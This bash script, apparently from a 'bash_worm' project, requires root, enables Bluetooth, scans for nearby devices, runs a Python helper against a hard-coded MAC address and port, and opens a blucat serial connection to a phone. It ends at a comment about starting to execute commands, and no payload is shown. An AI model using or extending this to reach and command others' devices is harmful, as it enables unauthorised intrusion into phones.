#!/bin/bash

NL=$'\n' # Environment variable to use the newline character 

# Define colors 
red='\e[1;31m'
green='\e[1;32m'
purple='\e[1;35m'
endColor='\e[0m'

##############################################################################################

# This method adds an ellipsis to text 
appendEllipsis() {
	numberOfDots=0
	until [[ $numberOfDots > 2 ]]; do
		echo -n "."
		sleep 0.3
		let "numberOfDots = $numberOfDots + 1"
	done
}

# Check if Bluetooth is turned on
CheckBluetooth() {
	testBluetooth="hciconfig | grep UP"
	eval $testBluetooth > /dev/null 
	exit_codes=$(echo $?)

	# If Bluetooth is turned off:
	if [ $exit_codes != "0" ]; then
		echo -e  -n "\n${red}Bluetooth is turned off.\nAttempting to turn on now${endColor}"
		appendEllipsis; echo ${NL};
		turn_on="hciconfig hci0 up"
		eval $turn_on > /dev/tty 
		exit_codes=$(echo $?)
		
		# If up command failed:
		if [ $exit_codes != "0" ]; then
			rfkill="rfkill unblock all"
			eval $rfkill > /dev/tty
			exit_codes=$(echo $?)
		
		else # If up command succeed:
			echo -e -n "\n${green}Bluetooth is now turned on.\nScanning for nearby devices${endColor}"
			appendEllipsis; echo ${NL}; 
			my_array=( $(hcitool scan) )
		fi
		
	else # If Bluetooth is turned on:
		echo -e -n "\n${green}Bluetooth is turned on.\nScanning for nearby devices${endColor}"
		appendEllipsis; echo ${NL}; 
		my_array=( $(hcitool scan) )
	fi
}

# Call Python Program with bash variables as parameters
executePython() {
	start_python="python alert.py '$mac_addr' '$port'"
	eval $start_python > /dev/tty
	exit_codes2=$(echo $?)
}

##############################################################################################

# Check if user is root
	# True - Assign permissions 
	# False - Remove stderr, use formatted error msgs and exit

FILE="/tmp/out.$$"

GREP="/bin/grep"
if test $EUID -eq 0; then
	echo `chmod 744 bash_worm.sh`
	
else > /dev/null # Removes stderr and replaces with custom error message
	E_NOTROOT=67
	echo -e "${red}Error:${endColor} This script must be run as root" 
	echo -e "${red}Exit Code: $E_NOTROOT ${endColor}"
	exit $E_NOTROOT
fi
      
# Call CheckBluetooth Function
echo -e -n "${green}Checking that Master Device is working${endColor}"
appendEllipsis; echo ${NL}; 
CheckBluetooth

# Get MAC Address and Device Name
mac_addr="E4:2D:02:BD:8A:9D"
port=11

# Call executePython Function
echo -e -n "\n${green}Beginning execution of python script${endColor}"
appendEllipsis; echo ${NL};
executePython

if [ $exit_codes2 != "0" ]; then
	echo -n -e "${red}Error occured while executing python script${endColor}.\nTry again?: [${green}y${endColor}/${red}n${endColor}]: "
	read answer

	if [ $answer == "y"]; then
		executePython
	fi
fi

# Remove colons from MAC address
mac_addr="${mac_addr//[:]/}"

# Locates services on devices
phone_services=( $(./blucat services) )
serial_port="btspp://${mac_addr}:11"

# Connect to Serial Port
echo -e -n "\n${green}Connecting to Serial Port${endColor}"
appendEllipsis; echo ${NL};

connectPhone="./blucat -url ${serial_port}"
eval $connectPhone > /dev/tty 
exit_codes=$(echo $?)

# Start executing commands :D